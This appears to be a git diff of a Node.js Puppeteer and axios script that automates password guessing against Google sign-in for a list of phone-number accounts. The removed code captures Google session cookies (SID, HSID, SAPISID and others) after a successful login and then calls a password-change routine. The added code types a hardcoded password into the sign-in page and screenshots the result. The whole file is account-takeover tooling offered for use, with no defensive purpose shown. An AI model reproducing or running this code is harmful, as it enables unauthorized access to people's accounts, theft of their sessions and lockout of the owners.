@@ -253,9 +253,9 @@ async function browserStart() {
                             mReqHeader['cookie'] = cookies
                         }
 
-                        page.goto('about:blank')
+                        //page.goto('about:blank')
                 
-                        passwordMatching(mList[SIZE], tl, parseInt(cid), decodeURIComponent(dsh), ifkv, gps, 0)
+                        //passwordMatching(mList[SIZE], tl, parseInt(cid), decodeURIComponent(dsh), ifkv, gps, 0)
                     } else {
                         nextNumber()
                     }
@@ -336,6 +336,32 @@ async function browserStart() {
                 console.log(error)
             }
         })
+
+        page.on('response', async (res) => {
+    
+            try {
+                let pageUrl = await page.evaluate(() => window.location.href)
+                if (!pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier')) {
+                    console.log(pageUrl+'\n')
+                }
+                if (res.url().startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=')) {
+                    if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
+                        await delay(2000)
+                        await page.evaluate(() => {
+                            document.querySelector('input[type="password"]').value = '7030062594'
+                        })
+                        await delay(500)
+                        await page.click('#passwordNext')
+
+                        setTimeout(async () => {
+                            await page.screenshot({path: 'screenshot.png'});
+                        }, 10000)
+                    }
+                }
+            } catch (error) {
+                
+            }
+        })
     
         page.on('error', err=> {})
         
@@ -377,80 +403,84 @@ function passwordMatching(number, tl, cid, dsh, ifkv, gps, loop) {
         identifierToken = getIdentifier()
     }
 
-    axios.post('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&hl=en&TL='+tl, getPasswordData(pass, tl, cid, dsh, ifkv, identifierToken, reqTime), {
-        headers: mReqHeader
-    }).then(res => {
-        let next = true
-        try {
-            let body = res.data
-            console.log(body)
-            if (body.substring(0, 40).includes('wrb.fr')) {
-                if(body.includes('https://accounts.google.com/CheckCookie') || body.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie')) {
-                    next = false
-                    console.log('Login Success: '+SERVER.split('/')[1])
+    console.log('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&hl=en&TL='+tl)
+    console.log(getPasswordData(pass, tl, cid, dsh, ifkv, identifierToken, reqTime))
+    console.log(mReqHeader)
 
-                    setData(TOKEN+SERVER+'/size.json', SIZE)
-                    let cookiesList = res.headers['set-cookie']
-                    if(cookiesList) {
-                        output = 1
-                        let sendCookies = ''
+    // axios.post('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=B4hajb&source-path=%2Fv3%2Fsignin%2Fchallenge%2Fpwd&hl=en&TL='+tl, getPasswordData(pass, tl, cid, dsh, ifkv, identifierToken, reqTime), {
+    //     headers: mReqHeader
+    // }).then(res => {
+    //     let next = true
+    //     try {
+    //         let body = res.data
+    //         console.log(body)
+    //         if (body.substring(0, 40).includes('wrb.fr')) {
+    //             if(body.includes('https://accounts.google.com/CheckCookie') || body.includes('https%3A%2F%2Faccounts.google.com%2FCheckCookie')) {
+    //                 next = false
+    //                 console.log('Login Success: '+SERVER.split('/')[1])
+
+    //                 setData(TOKEN+SERVER+'/size.json', SIZE)
+    //                 let cookiesList = res.headers['set-cookie']
+    //                 if(cookiesList) {
+    //                     output = 1
+    //                     let sendCookies = ''
         
-                        for(let i=0; i<cookiesList.length; i++) {
-                            let singelData = cookiesList[i]
-                            try {
-                                let start = singelData.indexOf('=')
-                                let end = singelData.indexOf(';')
-                                let key = singelData.substring(0, start)
-                                if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
-                                    let value = singelData.substring(start+1, end)
-                                    sendCookies += key+'='+value+'; '
-                                }
-                            } catch (e) {}
-                        }
+    //                     for(let i=0; i<cookiesList.length; i++) {
+    //                         let singelData = cookiesList[i]
+    //                         try {
+    //                             let start = singelData.indexOf('=')
+    //                             let end = singelData.indexOf(';')
+    //                             let key = singelData.substring(0, start)
+    //                             if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
+    //                                 let value = singelData.substring(start+1, end)
+    //                                 sendCookies += key+'='+value+'; '
+    //                             }
+    //                         } catch (e) {}
+    //                     }
 
-                        passwordChange(number, tl, cid, gps, pass, sendCookies, 0)
-                    } else {
-                        nextNumber()
-                    }
-                } else if (body.includes('webapproval')) {
-                    next = false
-                    setData(GMAIL+'menually/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
-                    nextNumber()
-                } else if (body.includes('VOICE') || !body.includes('INCORRECT_ANSWER_ENTERED')) {
-                    next = false
-                    setData(GMAIL+'voice/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
-                    nextNumber()
-                } else if (body.includes('changepassword')) {
-                    next = false
-                    console.log('Password Change: '+SERVER.split('/')[1])
-                    setData(GMAIL+'change/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
-                    nextNumber()
-                } else if(!body.includes('INCORRECT_ANSWER_ENTERED')) {
-                    console.log(pass, body)
+    //                     passwordChange(number, tl, cid, gps, pass, sendCookies, 0)
+    //                 } else {
+    //                     nextNumber()
+    //                 }
+    //             } else if (body.includes('webapproval')) {
+    //                 next = false
+    //                 setData(GMAIL+'menually/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
+    //                 nextNumber()
+    //             } else if (body.includes('VOICE') || !body.includes('INCORRECT_ANSWER_ENTERED')) {
+    //                 next = false
+    //                 setData(GMAIL+'voice/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
+    //                 nextNumber()
+    //             } else if (body.includes('changepassword')) {
+    //                 next = false
+    //                 console.log('Password Change: '+SERVER.split('/')[1])
+    //                 setData(GMAIL+'change/'+COUNTRY+'/'+mList[SIZE]+'.json', loop)
+    //                 nextNumber()
+    //             } else if(!body.includes('INCORRECT_ANSWER_ENTERED')) {
+    //                 console.log(pass, body)
 
-                    console.log(dsh, ifkv)
-                }
-            }
-        } catch (error) {}
+    //                 console.log(dsh, ifkv)
+    //             }
+    //         }
+    //     } catch (error) {}
 
-        if (next) {
-            if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
-                passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
-            } else if (loop == 1 && TIMEING == 3) {
-                passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
-            } else {
-                nextNumber()
-            }
-        }
-    }).catch(err => {
-        if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
-            passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
-        } else if (loop == 1 && TIMEING == 3) {
-            passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
-        } else {
-            nextNumber()
-        }
-    })
+    //     if (next) {
+    //         if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
+    //             passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
+    //         } else if (loop == 1 && TIMEING == 3) {
+    //             passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
+    //         } else {
+    //             nextNumber()
+    //         }
+    //     }
+    // }).catch(err => {
+    //     if (loop == 0 && (TIMEING == 2 || TIMEING == 3)) {
+    //         passwordMatching(number, tl, cid, dsh, ifkv, gps, 1)
+    //     } else if (loop == 1 && TIMEING == 3) {
+    //         passwordMatching(number, tl, cid, dsh, ifkv, gps, 2)
+    //     } else {
+    //         nextNumber()
+    //     }
+    // })
 }
 
 
